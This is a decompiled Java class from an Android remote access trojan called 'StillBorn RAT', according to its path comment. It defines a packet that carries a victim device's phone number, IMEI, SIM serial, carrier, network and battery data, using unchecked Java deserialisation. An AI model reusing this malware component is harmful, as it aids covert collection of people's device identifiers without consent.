/*   1:    */ package Packet;
/*   2:    */ 
/*   3:    */ import java.io.ByteArrayInputStream;
/*   4:    */ import java.io.ByteArrayOutputStream;
/*   5:    */ import java.io.IOException;
/*   6:    */ import java.io.ObjectInputStream;
/*   7:    */ import java.io.ObjectOutputStream;
/*   8:    */ import java.io.Serializable;
/*   9:    */ import java.util.ArrayList;
/*  10:    */ 
/*  11:    */ public class AdvancedInformationPacket
/*  12:    */   implements Packet, Serializable
/*  13:    */ {
/*  14:    */   private static final long serialVersionUID = 44346671562310318L;
/*  15:    */   String phoneNumber;
/*  16:    */   String IMEI;
/*  17:    */   String softwareVersion;
/*  18:    */   String countryCode;
/*  19:    */   String operatorCode;
/*  20:    */   String operatorName;
/*  21:    */   String simOperatorCode;
/*  22:    */   String simOperatorName;
/*  23:    */   String simCountryCode;
/*  24:    */   String simSerial;
/*  25:    */   boolean wifiAvailable;
/*  26:    */   boolean wifiConnectedOrConnecting;
/*  27:    */   String wifiExtraInfos;
/*  28:    */   String wifiReason;
/*  29:    */   String mobileNetworkName;
/*  30:    */   boolean mobileNetworkAvailable;
/*  31:    */   boolean mobileNetworkConnectedOrConnecting;
/*  32:    */   String mobileNetworkExtraInfos;
/*  33:    */   String mobileNetworkReason;
/*  34:    */   String androidVersion;
/*  35:    */   int androidSdk;
/*  36:    */   ArrayList<String> sensors;
/*  37:    */   int batteryHealth;
/*  38:    */   int batteryLevel;
/*  39:    */   int batteryPlugged;
/*  40:    */   boolean batteryPresent;
/*  41:    */   int batteryScale;
/*  42:    */   int batteryStatus;
/*  43:    */   String batteryTechnology;
/*  44:    */   int batteryTemperature;
/*  45:    */   int batteryVoltage;
/*  46:    */   
/*  47:    */   public byte[] build()
/*  48:    */   {
/*  49:    */     try
/*  50:    */     {
/*  51: 72 */       ByteArrayOutputStream bos = new ByteArrayOutputStream();
/*  52: 73 */       ObjectOutputStream out = new ObjectOutputStream(bos);
/*  53: 74 */       out.writeObject(this);
/*  54: 75 */       return bos.toByteArray();
/*  55:    */     }
/*  56:    */     catch (IOException e) {}
/*  57: 77 */     return null;
/*  58:    */   }
/*  59:    */   
/*  60:    */   public void parse(byte[] packet)
/*  61:    */   {
/*  62: 82 */     ByteArrayInputStream bis = new ByteArrayInputStream(packet);
/*  63:    */     try
/*  64:    */     {
/*  65: 85 */       ObjectInputStream in = new ObjectInputStream(bis);
/*  66: 86 */       AdvancedInformationPacket adv = (AdvancedInformationPacket)in.readObject();
/*  67: 87 */       setPhoneNumber(adv.getPhoneNumber());
/*  68: 88 */       setIMEI(adv.getIMEI());
/*  69: 89 */       setSoftwareVersion(adv.getSoftwareVersion());
/*  70: 90 */       setCountryCode(adv.getCountryCode());
/*  71: 91 */       setOperatorCode(adv.getOperatorCode());
/*  72: 92 */       setOperatorName(adv.getOperatorName());
/*  73: 93 */       setSimOperatorCode(adv.getSimOperatorCode());
/*  74: 94 */       setSimOperatorName(adv.getSimOperatorName());
/*  75: 95 */       setSimCountryCode(adv.getSimCountryCode());
/*  76: 96 */       setSimSerial(adv.getSimSerial());
/*  77: 97 */       setWifiAvailable(adv.isWifiAvailable());
/*  78: 98 */       setWifiConnectedOrConnecting(adv.isWifiConnectedOrConnecting());
/*  79: 99 */       setWifiExtraInfos(adv.getWifiExtraInfos());
/*  80:100 */       setWifiReason(adv.getWifiReason());
/*  81:101 */       setMobileNetworkName(adv.getMobileNetworkName());
/*  82:102 */       setMobileNetworkAvailable(adv.isMobileNetworkAvailable());
/*  83:103 */       setMobileNetworkConnectedOrConnecting(adv.isMobileNetworkConnectedOrConnecting());
/*  84:104 */       setMobileNetworkExtraInfos(adv.getMobileNetworkExtraInfos());
/*  85:105 */       setMobileNetworkReason(adv.getMobileNetworkReason());
/*  86:106 */       setAndroidVersion(adv.getAndroidVersion());
/*  87:107 */       setAndroidSdk(adv.getAndroidSdk());
/*  88:108 */       setSensors(adv.getSensors());
/*  89:109 */       setBatteryHealth(adv.getBatteryHealth());
/*  90:110 */       setBatteryLevel(adv.getBatteryLevel());
/*  91:111 */       setBatteryPlugged(adv.getBatteryPlugged());
/*  92:112 */       setBatteryPresent(adv.isBatteryPresent());
/*  93:113 */       setBatteryScale(adv.getBatteryScale());
/*  94:114 */       setBatteryStatus(adv.getBatteryStatus());
/*  95:115 */       setBatteryTechnology(adv.getBatteryTechnology());
/*  96:116 */       setBatteryTemperature(adv.getBatteryTemperature());
/*  97:117 */       setBatteryVoltage(adv.getBatteryVoltage());
/*  98:    */     }
/*  99:    */     catch (Exception localException) {}
/* 100:    */   }
/* 101:    */   
/* 102:    */   public String getPhoneNumber()
/* 103:    */   {
/* 104:123 */     return this.phoneNumber;
/* 105:    */   }
/* 106:    */   
/* 107:    */   public String getSimCountryCode()
/* 108:    */   {
/* 109:127 */     return this.simCountryCode;
/* 110:    */   }
/* 111:    */   
/* 112:    */   public void setSimCountryCode(String code)
/* 113:    */   {
/* 114:131 */     this.simCountryCode = code;
/* 115:    */   }
/* 116:    */   
/* 117:    */   public void setPhoneNumber(String phoneNumber)
/* 118:    */   {
/* 119:135 */     this.phoneNumber = phoneNumber;
/* 120:    */   }
/* 121:    */   
/* 122:    */   public String getIMEI()
/* 123:    */   {
/* 124:139 */     return this.IMEI;
/* 125:    */   }
/* 126:    */   
/* 127:    */   public void setIMEI(String iMEI)
/* 128:    */   {
/* 129:143 */     this.IMEI = iMEI;
/* 130:    */   }
/* 131:    */   
/* 132:    */   public String getSoftwareVersion()
/* 133:    */   {
/* 134:147 */     return this.softwareVersion;
/* 135:    */   }
/* 136:    */   
/* 137:    */   public void setSoftwareVersion(String softwareVersion)
/* 138:    */   {
/* 139:151 */     this.softwareVersion = softwareVersion;
/* 140:    */   }
/* 141:    */   
/* 142:    */   public String getCountryCode()
/* 143:    */   {
/* 144:155 */     return this.countryCode;
/* 145:    */   }
/* 146:    */   
/* 147:    */   public void setCountryCode(String countryCode)
/* 148:    */   {
/* 149:159 */     this.countryCode = countryCode;
/* 150:    */   }
/* 151:    */   
/* 152:    */   public String getOperatorCode()
/* 153:    */   {
/* 154:163 */     return this.operatorCode;
/* 155:    */   }
/* 156:    */   
/* 157:    */   public void setOperatorCode(String operatorCode)
/* 158:    */   {
/* 159:167 */     this.operatorCode = operatorCode;
/* 160:    */   }
/* 161:    */   
/* 162:    */   public String getOperatorName()
/* 163:    */   {
/* 164:171 */     return this.operatorName;
/* 165:    */   }
/* 166:    */   
/* 167:    */   public void setOperatorName(String operatorName)
/* 168:    */   {
/* 169:175 */     this.operatorName = operatorName;
/* 170:    */   }
/* 171:    */   
/* 172:    */   public String getSimOperatorCode()
/* 173:    */   {
/* 174:179 */     return this.simOperatorCode;
/* 175:    */   }
/* 176:    */   
/* 177:    */   public void setSimOperatorCode(String simOperatorCode)
/* 178:    */   {
/* 179:183 */     this.simOperatorCode = simOperatorCode;
/* 180:    */   }
/* 181:    */   
/* 182:    */   public String getSimOperatorName()
/* 183:    */   {
/* 184:187 */     return this.simOperatorName;
/* 185:    */   }
/* 186:    */   
/* 187:    */   public void setSimOperatorName(String simOperatorName)
/* 188:    */   {
/* 189:191 */     this.simOperatorName = simOperatorName;
/* 190:    */   }
/* 191:    */   
/* 192:    */   public String getSimSerial()
/* 193:    */   {
/* 194:195 */     return this.simSerial;
/* 195:    */   }
/* 196:    */   
/* 197:    */   public void setSimSerial(String simSerial)
/* 198:    */   {
/* 199:199 */     this.simSerial = simSerial;
/* 200:    */   }
/* 201:    */   
/* 202:    */   public boolean isWifiAvailable()
/* 203:    */   {
/* 204:203 */     return this.wifiAvailable;
/* 205:    */   }
/* 206:    */   
/* 207:    */   public void setWifiAvailable(boolean wifiAvailable)
/* 208:    */   {
/* 209:207 */     this.wifiAvailable = wifiAvailable;
/* 210:    */   }
/* 211:    */   
/* 212:    */   public boolean isWifiConnectedOrConnecting()
/* 213:    */   {
/* 214:211 */     return this.wifiConnectedOrConnecting;
/* 215:    */   }
/* 216:    */   
/* 217:    */   public void setWifiConnectedOrConnecting(boolean wifiConnectedOrConnecting)
/* 218:    */   {
/* 219:215 */     this.wifiConnectedOrConnecting = wifiConnectedOrConnecting;
/* 220:    */   }
/* 221:    */   
/* 222:    */   public String getWifiExtraInfos()
/* 223:    */   {
/* 224:219 */     return this.wifiExtraInfos;
/* 225:    */   }
/* 226:    */   
/* 227:    */   public void setWifiExtraInfos(String wifiExtraInfos)
/* 228:    */   {
/* 229:223 */     this.wifiExtraInfos = wifiExtraInfos;
/* 230:    */   }
/* 231:    */   
/* 232:    */   public String getWifiReason()
/* 233:    */   {
/* 234:227 */     return this.wifiReason;
/* 235:    */   }
/* 236:    */   
/* 237:    */   public void setWifiReason(String wifiReason)
/* 238:    */   {
/* 239:231 */     this.wifiReason = wifiReason;
/* 240:    */   }
/* 241:    */   
/* 242:    */   public String getMobileNetworkName()
/* 243:    */   {
/* 244:235 */     return this.mobileNetworkName;
/* 245:    */   }
/* 246:    */   
/* 247:    */   public void setMobileNetworkName(String mobileNetworkName)
/* 248:    */   {
/* 249:239 */     this.mobileNetworkName = mobileNetworkName;
/* 250:    */   }
/* 251:    */   
/* 252:    */   public boolean isMobileNetworkAvailable()
/* 253:    */   {
/* 254:243 */     return this.mobileNetworkAvailable;
/* 255:    */   }
/* 256:    */   
/* 257:    */   public void setMobileNetworkAvailable(boolean mobileNetworkAvailable)
/* 258:    */   {
/* 259:247 */     this.mobileNetworkAvailable = mobileNetworkAvailable;
/* 260:    */   }
/* 261:    */   
/* 262:    */   public boolean isMobileNetworkConnectedOrConnecting()
/* 263:    */   {
/* 264:251 */     return this.mobileNetworkConnectedOrConnecting;
/* 265:    */   }
/* 266:    */   
/* 267:    */   public void setMobileNetworkConnectedOrConnecting(boolean mobileNetworkConnectedOrConnecting)
/* 268:    */   {
/* 269:256 */     this.mobileNetworkConnectedOrConnecting = mobileNetworkConnectedOrConnecting;
/* 270:    */   }
/* 271:    */   
/* 272:    */   public String getMobileNetworkExtraInfos()
/* 273:    */   {
/* 274:260 */     return this.mobileNetworkExtraInfos;
/* 275:    */   }
/* 276:    */   
/* 277:    */   public void setMobileNetworkExtraInfos(String mobileNetworkExtraInfos)
/* 278:    */   {
/* 279:264 */     this.mobileNetworkExtraInfos = mobileNetworkExtraInfos;
/* 280:    */   }
/* 281:    */   
/* 282:    */   public String getMobileNetworkReason()
/* 283:    */   {
/* 284:268 */     return this.mobileNetworkReason;
/* 285:    */   }
/* 286:    */   
/* 287:    */   public void setMobileNetworkReason(String mobileNetworkReason)
/* 288:    */   {
/* 289:272 */     this.mobileNetworkReason = mobileNetworkReason;
/* 290:    */   }
/* 291:    */   
/* 292:    */   public String getAndroidVersion()
/* 293:    */   {
/* 294:276 */     return this.androidVersion;
/* 295:    */   }
/* 296:    */   
/* 297:    */   public void setAndroidVersion(String androidVersion)
/* 298:    */   {
/* 299:280 */     this.androidVersion = androidVersion;
/* 300:    */   }
/* 301:    */   
/* 302:    */   public int getAndroidSdk()
/* 303:    */   {
/* 304:284 */     return this.androidSdk;
/* 305:    */   }
/* 306:    */   
/* 307:    */   public void setAndroidSdk(int androidSdk)
/* 308:    */   {
/* 309:288 */     this.androidSdk = androidSdk;
/* 310:    */   }
/* 311:    */   
/* 312:    */   public ArrayList<String> getSensors()
/* 313:    */   {
/* 314:292 */     return this.sensors;
/* 315:    */   }
/* 316:    */   
/* 317:    */   public void setSensors(ArrayList<String> sensors)
/* 318:    */   {
/* 319:296 */     this.sensors = sensors;
/* 320:    */   }
/* 321:    */   
/* 322:    */   public int getBatteryHealth()
/* 323:    */   {
/* 324:300 */     return this.batteryHealth;
/* 325:    */   }
/* 326:    */   
/* 327:    */   public void setBatteryHealth(int batteryHealth)
/* 328:    */   {
/* 329:304 */     this.batteryHealth = batteryHealth;
/* 330:    */   }
/* 331:    */   
/* 332:    */   public int getBatteryLevel()
/* 333:    */   {
/* 334:308 */     return this.batteryLevel;
/* 335:    */   }
/* 336:    */   
/* 337:    */   public void setBatteryLevel(int batteryLevel)
/* 338:    */   {
/* 339:312 */     this.batteryLevel = batteryLevel;
/* 340:    */   }
/* 341:    */   
/* 342:    */   public int getBatteryPlugged()
/* 343:    */   {
/* 344:316 */     return this.batteryPlugged;
/* 345:    */   }
/* 346:    */   
/* 347:    */   public void setBatteryPlugged(int batteryPlugged)
/* 348:    */   {
/* 349:320 */     this.batteryPlugged = batteryPlugged;
/* 350:    */   }
/* 351:    */   
/* 352:    */   public boolean isBatteryPresent()
/* 353:    */   {
/* 354:324 */     return this.batteryPresent;
/* 355:    */   }
/* 356:    */   
/* 357:    */   public void setBatteryPresent(boolean batteryPresent)
/* 358:    */   {
/* 359:328 */     this.batteryPresent = batteryPresent;
/* 360:    */   }
/* 361:    */   
/* 362:    */   public int getBatteryScale()
/* 363:    */   {
/* 364:332 */     return this.batteryScale;
/* 365:    */   }
/* 366:    */   
/* 367:    */   public void setBatteryScale(int batteryScale)
/* 368:    */   {
/* 369:336 */     this.batteryScale = batteryScale;
/* 370:    */   }
/* 371:    */   
/* 372:    */   public int getBatteryStatus()
/* 373:    */   {
/* 374:340 */     return this.batteryStatus;
/* 375:    */   }
/* 376:    */   
/* 377:    */   public void setBatteryStatus(int batteryStatus)
/* 378:    */   {
/* 379:344 */     this.batteryStatus = batteryStatus;
/* 380:    */   }
/* 381:    */   
/* 382:    */   public String getBatteryTechnology()
/* 383:    */   {
/* 384:348 */     return this.batteryTechnology;
/* 385:    */   }
/* 386:    */   
/* 387:    */   public void setBatteryTechnology(String batteryTechnology)
/* 388:    */   {
/* 389:352 */     this.batteryTechnology = batteryTechnology;
/* 390:    */   }
/* 391:    */   
/* 392:    */   public int getBatteryTemperature()
/* 393:    */   {
/* 394:356 */     return this.batteryTemperature;
/* 395:    */   }
/* 396:    */   
/* 397:    */   public void setBatteryTemperature(int batteryTemperature)
/* 398:    */   {
/* 399:360 */     this.batteryTemperature = batteryTemperature;
/* 400:    */   }
/* 401:    */   
/* 402:    */   public int getBatteryVoltage()
/* 403:    */   {
/* 404:364 */     return this.batteryVoltage;
/* 405:    */   }
/* 406:    */   
/* 407:    */   public void setBatteryVoltage(int batteryVoltage)
/* 408:    */   {
/* 409:368 */     this.batteryVoltage = batteryVoltage;
/* 410:    */   }
/* 411:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     Packet.AdvancedInformationPacket
 * JD-Core Version:    0.7.0.1
 */